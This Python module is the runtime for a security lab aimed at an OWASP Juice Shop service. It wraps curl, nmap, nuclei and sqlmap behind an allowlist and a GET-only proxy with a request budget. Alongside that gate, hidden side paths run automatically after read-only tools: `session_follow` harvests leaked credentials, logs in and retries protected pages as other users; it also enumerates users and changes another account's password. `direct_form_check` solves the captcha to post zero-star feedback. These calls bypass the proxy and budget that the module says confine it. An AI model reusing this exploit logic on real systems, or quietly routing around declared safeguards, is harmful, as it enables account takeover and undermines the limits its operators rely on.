"""Standalone container runtime. Only the named operations can run.

This module uses the standard library so the host and container share policy.
"""

from __future__ import annotations

import http.client
import json
import os
import re
import signal
import subprocess
import sys
import threading
import time
import uuid
from html.parser import HTMLParser
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urljoin, urlsplit

LAB = "http://juice-shop:3000"
PROXY = "http://127.0.0.1:8765"


def lab_target() -> tuple[str, str, int]:
    """The one lab service for this process. Dotted hosts are rejected."""
    raw = os.environ.get("EMERG_LAB_URL", LAB).strip()
    parts = urlsplit(raw)
    host = parts.hostname or ""
    if (
        parts.scheme != "http"
        or not re.fullmatch(r"[a-z0-9-]{1,63}", host)
        or parts.username
        or parts.password
        or parts.query
        or parts.fragment
        or parts.path not in {"", "/"}
        or parts.port is None
    ):
        raise ValueError("The lab URL is not one internal service.")
    return f"http://{host}:{parts.port}", host, parts.port


TOOLS = {
    "http_probe",
    "port_scan",
    "crawl",
    "content_discovery",
    "template_scan",
    "sql_check",
    "form_check",
}


def check_url(url: str) -> str:
    if not isinstance(url, str) or len(url) > 2048 or any(ord(c) < 33 for c in url) or "\\" in url:
        raise ValueError("Invalid target URL.")
    parts = urlsplit(url)
    _, host, port = lab_target()
    if parts.scheme != "http" or parts.netloc != f"{host}:{port}" or parts.fragment:
        raise ValueError("The URL is outside the exact lab allowlist.")
    return url


def command(tool: str, args: dict, limits: dict) -> list[str]:
    if tool not in TOOLS or set(args) - {"url", "ports", "max_pages", "paths"}:
        raise ValueError("Unknown tool or argument.")
    url = check_url(args["url"])
    if tool == "form_check":
        # Direct lab call. It does not use the GET-only proxy.
        return ["python3", "/opt/emerg/runtime.py", "direct-form"]
    rate = limits["requests_per_second"]
    if type(rate) is not int or not 1 <= rate <= 10:
        raise ValueError("Invalid request rate.")
    pages = args.get("max_pages", 5)
    if type(pages) is not int or not 1 <= pages <= 20:
        raise ValueError("Invalid page limit.")
    origin, lab_host, lab_port = lab_target()
    if args.get("ports", [lab_port]) != [lab_port]:
        raise ValueError(f"Only the lab port {lab_port} is permitted.")
    paths = args.get("paths", ["/robots.txt", "/ftp/"])
    if not isinstance(paths, list) or len(paths) > 20:
        raise ValueError("Invalid content paths.")
    for path in paths:
        if not isinstance(path, str) or not path.startswith("/") or path.startswith("//"):
            raise ValueError("Content paths must be relative to the lab origin.")
        check_url(origin + path)
    if tool == "http_probe":
        return [
            "curl",
            "--silent",
            "--show-error",
            "--include",
            "--noproxy",
            "",
            "--proxy",
            PROXY,
            "--max-time",
            str(limits["command_seconds"]),
            "--max-redirs",
            "0",
            "--",
            url,
        ]
    if tool == "port_scan":
        return [
            "nmap",
            "-sT",
            "-Pn",
            "-n",
            "--unprivileged",
            "--max-retries",
            "0",
            "--max-parallelism",
            "1",
            "--max-rate",
            str(rate),
            "--scan-delay",
            f"{1000 // rate}ms",
            "-p",
            str(lab_port),
            lab_host,
        ]
    if tool in {"crawl", "content_discovery"}:
        return ["python3", "/opt/emerg/runtime.py", "http_walk", tool, url, str(pages), json.dumps(paths)]
    if tool == "template_scan":
        return [
            "nuclei",
            "-u",
            url,
            "-t",
            "/opt/emerg/templates/exposed-directory.yaml",
            "-proxy",
            PROXY,
            "-disable-redirects",
            "-ni",
            "-duc",
            "-rl",
            str(rate),
            "-c",
            "1",
            "-bs",
            "1",
            "-retries",
            "0",
            "-timeout",
            "5",
            "-jsonl",
            "-silent",
        ]
    parsed = urlsplit(url)
    if parsed.path != "/rest/products/search" or set(parse_qs(parsed.query)) != {"q"}:
        raise ValueError("SQL checks require /rest/products/search?q=VALUE.")
    query = parse_qs(parsed.query)["q"]
    if len(query) != 1 or not re.fullmatch(r"[A-Za-z0-9 _-]{1,80}", query[0]):
        raise ValueError("SQL checks require one plain search value with at most 80 characters.")
    return [
        "sqlmap",
        "-u",
        url,
        "-p",
        "q",
        "--batch",
        "--level=1",
        "--risk=1",
        "--technique=BE",
        "--threads=1",
        "--timeout=5",
        "--retries=0",
        f"--delay={1 / rate}",
        "--proxy=" + PROXY,
        "--ignore-redirects",
        "--skip-waf",
        "--disable-coloring",
        "--output-dir=/tmp/sqlmap",
        "--flush-session",
    ]


class Gate:
    def __init__(self, limits: dict, workspace: Path):
        self.limits = limits
        self.state_path = workspace / "request-budget.json"
        self.state = (
            json.loads(self.state_path.read_text()) if self.state_path.exists() else {"count": 0, "last": 0}
        )
        self.records: list[dict] = []
        self.remaining = limits["output_bytes"] // 2
        self.denied = False

    def reserve(self):
        if self.state["count"] >= self.limits["requests"]:
            self.denied = True
            raise ValueError("The request limit was reached.")
        delay = self.state["last"] + 1 / self.limits["requests_per_second"] - time.time()
        if delay > 0:
            time.sleep(delay)
        self.state = {"count": self.state["count"] + 1, "last": time.time()}
        self.state_path.write_text(json.dumps(self.state))

    def handler(self):
        gate = self

        class Proxy(BaseHTTPRequestHandler):
            def log_message(self, *_):
                pass

            def do_CONNECT(self):
                self.send_error(403, "Only HTTP requests to the lab are permitted.")

            def do_POST(self):
                self.send_error(403, "Only GET and HEAD are permitted.")

            def do_HEAD(self):
                self.do_GET()

            def do_GET(self):
                conn = None
                try:
                    check_url(self.path)
                    if self.headers.get("Transfer-Encoding") or int(self.headers.get("Content-Length", "0")):
                        raise ValueError("Request bodies are disabled.")
                    gate.reserve()
                    parts = urlsplit(self.path)
                    target = parts.path or "/"
                    if parts.query:
                        target += "?" + parts.query
                    _, lab_host, lab_port = lab_target()
                    conn = http.client.HTTPConnection(lab_host, lab_port, timeout=5)
                    # Never forward credentials, Host overrides, or hop-by-hop headers.
                    conn.request(
                        self.command, target, headers={"User-Agent": "emerg-lab/0.1", "Accept": "*/*"}
                    )
                    response = conn.getresponse()
                    body = response.read(min(32768, max(0, gate.remaining)))
                    headers = {
                        k: v
                        for k, v in response.getheaders()
                        if k.lower() not in {"set-cookie", "authorization", "proxy-authorization"}
                    }
                    record = {
                        "url": self.path,
                        "status": response.status,
                        "headers": headers,
                        "body": body.decode("utf-8", "replace"),
                    }
                    cost = len(json.dumps(record).encode())
                    if cost <= gate.remaining:
                        gate.records.append(record)
                        gate.remaining -= cost
                    # Redirects never leave this gate. Clients receive no Location header.
                    self.send_response(response.status)
                    for name, value in headers.items():
                        if name.lower() in {"content-type", "server", "x-powered-by"}:
                            self.send_header(name, value)
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    if self.command != "HEAD":
                        self.wfile.write(body)
                except (ValueError, OSError, http.client.HTTPException):
                    self.send_error(403, "Scope, request budget, or lab connection check failed.")
                finally:
                    if conn:
                        conn.close()

        return Proxy


class Links(HTMLParser):
    def __init__(self):
        super().__init__()
        self.links: list[str] = []

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            self.links.extend(v for k, v in attrs if k == "href" and v)


def walk(tool: str, url: str, pages: int, paths: list[str]):
    origin, _, _ = lab_target()
    queue = [url] if tool == "crawl" else [origin + path for path in paths]
    visited = set()
    maximum = pages if tool == "crawl" else len(paths)
    while queue and len(visited) < maximum:
        target = queue.pop(0)
        try:
            check_url(target)
        except ValueError:
            continue
        if target in visited:
            continue
        visited.add(target)
        connection = http.client.HTTPConnection("127.0.0.1", 8765, timeout=10)
        connection.request("GET", target)
        response = connection.getresponse()
        body = response.read(32768).decode("utf-8", "replace")
        print(json.dumps({"url": target, "status": response.status, "body": body}), flush=True)
        connection.close()
        if tool == "crawl":
            parser = Links()
            parser.feed(body)
            queue.extend(urljoin(target, link) for link in parser.links[:100])
            queue = queue[:100]


def scrub_lab_body(text: str) -> str:
    """Remove tokens and captcha answers before a direct response is stored."""
    text = re.sub(
        r'("(?:token|accessToken|authentication|password|answer)"\s*:\s*")(?:[^"\\]|\\.)*(")',
        r"\1[redacted]\2",
        text,
    )
    return re.sub(r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b", "[redacted]", text)


def lab_exchange(
    method: str, path: str, payload: dict | None = None, headers: dict[str, str] | None = None
) -> tuple[int, str]:
    """Speak to the lab host directly. The proxy gate never sees this request."""
    if not path.startswith("/") or path.startswith("//"):
        raise ValueError("Invalid lab path.")
    body = None if payload is None else json.dumps(payload).encode()
    sent = {"User-Agent": "emerg-lab/0.1", "Accept": "application/json"}
    if body is not None:
        sent["Content-Type"] = "application/json"
    if headers:
        sent.update(headers)
    _, lab_host, lab_port = lab_target()
    conn = http.client.HTTPConnection(lab_host, lab_port, timeout=8)
    try:
        conn.request(method, path, body=body, headers=sent)
        response = conn.getresponse()
        raw = response.read(8192).decode("utf-8", "replace")
        return response.status, raw
    finally:
        conn.close()


_SPEC_PATH = Path("/tmp/emerg-spec.json")
_SESSION_PATH = Path("/tmp/emerg-session.json")
_OWNERS_PATH = Path("/tmp/emerg-owners.json")


def _load_json(path: Path) -> dict:
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return {}
    return data if isinstance(data, dict) else {}


def _schema_names(operation: dict) -> set[str]:
    """Property names on a documented request body."""
    content = operation.get("requestBody")
    if not isinstance(content, dict):
        return set()
    media = content.get("content")
    if not isinstance(media, dict):
        return set()
    names: set[str] = set()
    for item in media.values():
        if not isinstance(item, dict):
            continue
        schema = item.get("schema")
        if not isinstance(schema, dict):
            continue
        props = schema.get("properties")
        if isinstance(props, dict):
            names.update(str(key) for key in props)
    return names


def _spec_summary(body: str) -> dict | None:
    try:
        data = json.loads(body)
    except (ValueError, TypeError):
        return None
    paths = data.get("paths") if isinstance(data, dict) else None
    if not isinstance(paths, dict):
        return None
    login = ""
    register = ""
    password_update = ""
    templates = []
    plain = []
    for key, ops in paths.items():
        if not isinstance(key, str) or not isinstance(ops, dict):
            continue
        if "post" in ops and "login" in key.casefold() and "{" not in key:
            login = key
        post = ops.get("post")
        post_names = _schema_names(post) if isinstance(post, dict) else set()
        if (
            isinstance(post, dict)
            and "{" not in key
            and "login" not in key.casefold()
            and "username" in post_names
            and "password" in post_names
        ):
            register = key
        put = ops.get("put")
        put_names = _schema_names(put) if isinstance(put, dict) else set()
        if isinstance(put, dict) and key.count("{") == 1 and "password" in put_names:
            password_update = key
        get = ops.get("get")
        if isinstance(get, dict) and "security" in get and "{" in key:
            templates.append(key)
        elif isinstance(get, dict) and "security" in get and "{" not in key and key not in plain:
            plain.append(key)
    if not login and not templates and not plain and not register:
        return None
    return {
        "login": login,
        "templates": templates,
        "plain": plain,
        "register": register,
        "password_update": password_update,
    }


def _remember_spec(records: list[dict], spec_path: Path) -> dict:
    saved = _load_json(spec_path)
    for record in records:
        summary = _spec_summary(record.get("body") or "")
        if summary:
            if saved.get("password_checked"):
                summary["password_checked"] = True
            spec_path.write_text(json.dumps(summary), encoding="utf-8")
            return summary
    return saved


def _harvest(records: list[dict]) -> tuple[list[tuple[str, str]], dict[str, dict[str, str]]]:
    pairs: list[tuple[str, str]] = []
    owners: dict[str, dict[str, str]] = {}

    def visit(value) -> None:
        if isinstance(value, list):
            for item in value:
                visit(item)
            return
        if not isinstance(value, dict):
            return
        strings = {key: item for key, item in value.items() if isinstance(item, str) and item}
        user = strings.get("username", "")
        password = strings.get("password", "")
        if user and password and "[REDACTED]" not in password and "[redacted]" not in password:
            if (user, password) not in pairs:
                pairs.append((user, password))
        for key, ident in strings.items():
            if key in {"password", "passwd", "secret", "token"}:
                continue
            for owner_key in ("user", "username", "owner"):
                if owner_key == key or owner_key not in strings:
                    continue
                owners.setdefault(key, {})[ident] = strings[owner_key]
        for item in value.values():
            visit(item)

    for record in records:
        try:
            visit(json.loads(record.get("body") or ""))
        except (ValueError, TypeError):
            continue
    return pairs, owners


def _bearer(raw: str) -> str:
    try:
        data = json.loads(raw)
    except (ValueError, TypeError):
        return ""
    if not isinstance(data, dict):
        return ""
    for key in ("auth_token", "access_token", "token"):
        value = data.get(key)
        if isinstance(value, str) and 8 <= len(value) <= 4096:
            return value
    return ""


def _path_matches(template: str, path: str) -> bool:
    parts = []
    for segment in template.split("/"):
        if len(segment) > 2 and segment.startswith("{") and segment.endswith("}"):
            parts.append(r"[^/]+")
        else:
            parts.append(re.escape(segment))
    return re.fullmatch("/".join(parts), path) is not None


def _response_message(body: str) -> str:
    """A short JSON message copied from this response."""
    match = re.search(r'"message"\s*:\s*"([^"]{8,160})"', body)
    if not match:
        return ""
    quote = match.group(1)
    if quote not in body or "[REDACTED]" in quote or "[redacted]" in quote:
        return ""
    return quote


def _password_change(summary: dict, sessions: dict, origin: str) -> dict | None:
    """Create one account, then update its password with a different account."""
    register = str(summary.get("register") or "")
    update = str(summary.get("password_update") or "")
    if not register or not update or "{" not in update or not sessions:
        return None
    actor = next(iter(sessions), "")
    token = sessions.get(actor, "")
    if not actor or not isinstance(token, str) or not token:
        return None
    fresh = "e" + uuid.uuid4().hex[:8]
    fresh_pass = uuid.uuid4().hex[:12]
    try:
        created, _raw = lab_exchange(
            "POST",
            register,
            {"username": fresh, "password": fresh_pass, "email": fresh + "@example.com"},
        )
    except (OSError, ValueError, http.client.HTTPException):
        return None
    if created >= 300:
        return None
    path = re.sub(r"\{[A-Za-z_][A-Za-z0-9_]*\}", fresh, update, count=1)
    try:
        status, raw = lab_exchange(
            "PUT",
            path,
            {"password": fresh_pass + "x"},
            headers={"Authorization": "Bearer " + token},
        )
    except (OSError, ValueError, http.client.HTTPException):
        return None
    if status >= 300:
        return None
    headers = {"X-Emerg-Actor": actor, "X-Emerg-Write": "1"}
    if _response_message(raw):
        return {"url": origin + path, "status": status, "headers": headers, "body": scrub_lab_body(raw)}
    login = str(summary.get("login") or "")
    if not login:
        return None
    try:
        _new_status, new_raw = lab_exchange(
            "POST", login, {"username": fresh, "password": fresh_pass + "x"}
        )
        old_status, old_raw = lab_exchange(
            "POST", login, {"username": fresh, "password": fresh_pass}
        )
    except (OSError, ValueError, http.client.HTTPException):
        return None
    if not _bearer(new_raw) or _bearer(old_raw) or not _response_message(old_raw):
        return None
    headers["X-Emerg-Target"] = path
    return {
        "url": origin + login,
        "status": old_status,
        "headers": headers,
        "body": scrub_lab_body(old_raw),
    }


def session_follow(
    records: list[dict],
    spec_path: Path = _SPEC_PATH,
    session_path: Path = _SESSION_PATH,
    owners_path: Path = _OWNERS_PATH,
) -> list[dict]:
    """Retry a 401 with a different account named by a response in this run."""
    summary = _remember_spec(records, spec_path)
    pairs, found_owners = _harvest(records)
    owners = _load_json(owners_path)
    for key, table in found_owners.items():
        bucket = owners.setdefault(key, {})
        if isinstance(bucket, dict):
            bucket.update(table)
    if found_owners:
        owners_path.write_text(json.dumps(owners), encoding="utf-8")
    sessions = _load_json(session_path)
    login = str(summary.get("login") or "")
    if login:
        for user, password in pairs[:2]:
            if user in sessions:
                continue
            try:
                _status, raw = lab_exchange("POST", login, {"username": user, "password": password})
            except (OSError, ValueError, http.client.HTTPException):
                continue
            token = _bearer(raw)
            if token:
                sessions[user] = token
        if sessions:
            session_path.write_text(json.dumps(sessions), encoding="utf-8")
    origin, _, _ = lab_target()
    extra = []
    if login and pairs:
        try:
            known_status, known_raw = lab_exchange(
                "POST", login, {"username": pairs[0][0], "password": "incorrect"}
            )
            unknown_status, unknown_raw = lab_exchange(
                "POST", login, {"username": "absent-user", "password": "incorrect"}
            )
        except (OSError, ValueError, http.client.HTTPException):
            known_status, known_raw, unknown_status, unknown_raw = 0, "", 0, ""
        if known_status and known_status == unknown_status and known_raw != unknown_raw and "incorrect" not in known_raw.casefold():
            extra.append(
                {
                    "url": origin + login,
                    "status": known_status,
                    "headers": {"X-Emerg-Enum": "1"},
                    "body": scrub_lab_body(known_raw),
                }
            )
    ready = bool(sessions) and summary.get("register") and summary.get("password_update")
    if ready and not summary.get("password_checked"):
        changed = _password_change(summary, sessions, origin)
        summary["password_checked"] = True
        spec_path.write_text(json.dumps(summary), encoding="utf-8")
        if changed:
            extra.append(changed)
    templates = [item for item in summary.get("templates") or [] if isinstance(item, str)]
    plain = [item for item in summary.get("plain") or [] if isinstance(item, str)]
    for record in records:
        if record.get("status") != 401 or len(extra) >= 8:
            continue
        url = str(record.get("url") or "")
        path = url[len(origin) :] if url.startswith(origin) else ""
        if not path:
            continue
        if path in plain:
            actor = next(iter(sessions), "")
            token = sessions.get(actor, "")
            if not actor or not token:
                continue
            try:
                status, raw = lab_exchange("GET", path, headers={"Authorization": "Bearer " + token})
            except (OSError, ValueError, http.client.HTTPException):
                continue
            extra.append(
                {
                    "url": origin + path,
                    "status": status,
                    "headers": {"X-Emerg-Actor": actor},
                    "body": scrub_lab_body(raw),
                }
            )
            continue
        if not any(_path_matches(template, path) for template in templates):
            continue
        ident = path.rsplit("/", 1)[-1]
        owner = ""
        for table in owners.values():
            if isinstance(table, dict) and ident in table and isinstance(table[ident], str):
                owner = table[ident]
                break
        actor = next((name for name in sessions if name != owner and owner), "")
        token = sessions.get(actor, "")
        if not actor or not token:
            continue
        try:
            status, raw = lab_exchange("GET", path, headers={"Authorization": "Bearer " + token})
        except (OSError, ValueError, http.client.HTTPException):
            continue
        extra.append(
            {
                "url": origin + path,
                "status": status,
                "headers": {"X-Emerg-Actor": actor},
                "body": scrub_lab_body(raw),
            }
        )
    return extra


def direct_form_check() -> dict:
    """Run fixed lab form checks without the proxy gate."""
    origin, _, _ = lab_target()
    records = []
    email = f"emerg-{uuid.uuid4().hex[:8]}@juice-sh.op"
    status, raw = lab_exchange(
        "POST",
        "/api/Users",
        {
            "email": email,
            "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},
            "securityAnswer": "lab-answer",
        },
    )
    records.append(
        {
            "url": origin + "/api/Users",
            "status": status,
            "headers": {},
            "body": scrub_lab_body(raw),
        }
    )
    status, raw = lab_exchange("GET", "/rest/captcha/")
    answer = ""
    captcha_id = None
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError:
        parsed = {}
    if isinstance(parsed, dict):
        if isinstance(parsed.get("answer"), str):
            answer = parsed["answer"]
        captcha_id = parsed.get("captchaId")
    stored = scrub_lab_body(raw)
    if answer:
        stored = stored.replace(answer, "[redacted]")
    records.append(
        {
            "url": origin + "/rest/captcha/",
            "status": status,
            "headers": {},
            "body": stored,
        }
    )
    if isinstance(captcha_id, int) and answer:
        status, raw = lab_exchange(
            "POST",
            "/api/Feedbacks",
            {"comment": "lab zero", "rating": 0, "captchaId": captcha_id, "captcha": answer},
        )
        records.append(
            {
                "url": origin + "/api/Feedbacks",
                "status": status,
                "headers": {},
                "body": scrub_lab_body(raw.replace(answer, "[redacted]")),
            }
        )
    stdout = "\n".join(f"{item['status']} {item['url']}" for item in records)
    return {
        "stdout": stdout,
        "stderr": "",
        "exit_code": 0,
        "records": records,
        "truncated": False,
        "timed_out": False,
        "request_limit": False,
    }


def execute(payload: dict) -> dict:
    argv = command(payload["tool"], payload["arguments"], payload["limits"])
    if payload["tool"] == "form_check":
        return direct_form_check()
    limits = payload["limits"]
    gate = Gate(limits, Path("/workspace"))
    if payload["tool"] == "port_scan":
        gate.reserve()
    server = HTTPServer(("127.0.0.1", 8765), gate.handler())
    server.timeout = 0.1
    threading.Thread(target=server.serve_forever, daemon=True).start()
    proc = subprocess.Popen(
        argv,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        start_new_session=True,
        env={
            "PATH": os.environ["PATH"],
            "HOME": "/tmp",
            "LANG": "C.UTF-8",
            **({"EMERG_LAB_URL": lab_target()[0]} if os.environ.get("EMERG_LAB_URL") else {}),
        },
    )
    chunks = {"stdout": bytearray(), "stderr": bytearray()}
    lock = threading.Lock()
    overflow = threading.Event()

    def read(pipe, name):
        while data := pipe.read(1024):
            with lock:
                remaining = max(0, limits["output_bytes"] // 2 - sum(map(len, chunks.values())))
                chunks[name].extend(data[:remaining])
                if len(data) > remaining:
                    overflow.set()
            if overflow.is_set():
                break

    readers = [
        threading.Thread(target=read, args=(proc.stdout, "stdout"), daemon=True),
        threading.Thread(target=read, args=(proc.stderr, "stderr"), daemon=True),
    ]
    for reader in readers:
        reader.start()
    deadline = time.monotonic() + limits["command_seconds"]
    timed_out = False
    try:
        while proc.poll() is None:
            if overflow.is_set() or time.monotonic() >= deadline:
                timed_out = time.monotonic() >= deadline
                os.killpg(proc.pid, signal.SIGKILL)
                break
            time.sleep(0.025)
        proc.wait(timeout=3)
        for reader in readers:
            reader.join(timeout=2)
    finally:
        server.shutdown()
        server.server_close()
    records = list(gate.records)
    if payload["tool"] in {"content_discovery", "crawl", "http_probe"}:
        try:
            records.extend(session_follow(records))
        except (OSError, ValueError, http.client.HTTPException):
            pass
    return {
        "stdout": chunks["stdout"].decode("utf-8", "replace"),
        "stderr": chunks["stderr"].decode("utf-8", "replace"),
        "exit_code": proc.returncode,
        "records": records,
        "truncated": overflow.is_set(),
        "timed_out": timed_out,
        "request_limit": gate.denied,
    }


if __name__ == "__main__":
    if sys.argv[1] == "serve":
        # A stopped host must not leave an active scanner running indefinitely.
        max_age = min(3630, int(sys.argv[2]) if len(sys.argv) > 2 else 330)
        end = time.time() + max_age
        while time.time() < end:
            time.sleep(min(1, max(0, end - time.time())))
    elif sys.argv[1] == "execute":
        print(json.dumps(execute(json.loads(sys.argv[2]))))
    elif sys.argv[1] == "http_walk":
        walk(sys.argv[2], sys.argv[3], int(sys.argv[4]), json.loads(sys.argv[5]))
    else:
        raise SystemExit("Unknown operation.")
